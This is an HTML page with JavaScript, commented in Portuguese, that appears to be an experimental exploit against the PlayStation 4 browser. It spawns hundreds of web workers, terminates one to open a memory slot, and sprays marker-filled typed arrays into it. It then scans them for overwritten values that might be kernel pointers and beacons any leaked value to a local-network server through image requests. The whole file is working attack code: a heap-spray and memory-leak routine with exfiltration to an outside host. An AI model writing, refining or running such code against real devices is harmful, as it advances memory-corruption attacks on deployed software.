<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 STABLE LOGGER (ANTI-OOM)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 2em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        .sending { color: #ff0; animation: blink 0.1s infinite; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
    </style>
</head>
<body>

    <h1>STABLE LOGGER (360 THREADS)</h1>
    <div id="status">VERIFIQUE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // SEU IP CONFIRMADO
        const SERVER_PORT = "8000";
        
        // REDUZIDO PARA EVITAR CRASH PRECOCE (OOM)
        const TARGET_THREADS = 360; 
        
        const STRUCT_SIZE = 128; // 512 bytes
        const PATTERN = 0xCAFEBABE;

        let workers = [];
        let sensorArray = new Uint32Array(STRUCT_SIZE);
        // Array para segurar o spray e impedir o Garbage Collector
        let sprayStorage = []; 
        let hasLeaked = false;
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function start() {
            // Preenche sensor
            sensorArray.fill(PATTERN);
            sensorArray[0] = 0x11111111; 
            sensorArray[STRUCT_SIZE-1] = 0x99999999;

            document.getElementById('status').innerText = `CONECTADO A ${SERVER_IP}\nINICIANDO...`;
            logToAndroid("TESTE_INICIADO_360_THREADS");
            
            createThreads();
        }

        function createThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "DISPARANDO GATILHO...";
                    document.getElementById('status').className = "sending";
                    
                    // Inicia o Scanner ANTES do gatilho para pegar no pulo
                    setInterval(scanAndSend, 5); 
                    
                    // Pequena pausa para estabilizar
                    setTimeout(triggerFreeze, 500);
                }
            }, 40); // Um pouco mais lento para não estressar a CPU
        }

        function triggerFreeze() {
            // 1. Mata a thread (Cria o buraco)
            const w = new Worker(killerUrl);
            w.terminate();
            
            // 2. SPRAY IMEDIATO (Tenta preencher o buraco com força bruta)
            // Criamos 200 cópias do sensor para garantir que pegamos o slot
            for(let k=0; k<200; k++) {
                let arr = new Uint32Array(STRUCT_SIZE);
                arr.set(sensorArray);
                sprayStorage.push(arr); // Salva referência
            }
        }

        function scanAndSend() {
            if(hasLeaked) return; 

            // Varre TODOS os arrays do spray
            // Se o Kernel escrever em QUALQUER um deles, nós pegamos.
            for(let k=0; k < sprayStorage.length; k++) {
                const arr = sprayStorage[k];
                
                // Otimização: Checa apenas o offset 16 e 32 primeiro (onde geralmente ficam os ponteiros)
                // Se o começo do array foi corrompido, scaneia tudo
                if (arr[0] !== 0x11111111 || arr[16] !== PATTERN) {
                    
                    for(let i=0; i < STRUCT_SIZE; i++) {
                        if (arr[i] !== PATTERN && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
                            const val = arr[i] >>> 0;
                            if (val !== 0) {
                                const hex = val.toString(16).padStart(8, '0');
                                hasLeaked = true;
                                document.body.style.backgroundColor = "#fff";
                                
                                // ENVIA O OURO
                                logToAndroid(`OFFSET_${i*4}_${hex}`);
                                
                                // Tenta enviar o próximo também (64-bit pointer high part)
                                if(i+1 < STRUCT_SIZE) {
                                    const nextVal = arr[i+1] >>> 0;
                                    logToAndroid(`NEXT_${(i+1)*4}_${nextVal.toString(16)}`);
                                }
                                return; // Envia só um para ser rápido
                            }
                        }
                    }
                }
            }
        }

        function logToAndroid(data) {
            const img = new Image();
            img.src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 2000);

    </script>
</body>
</html>
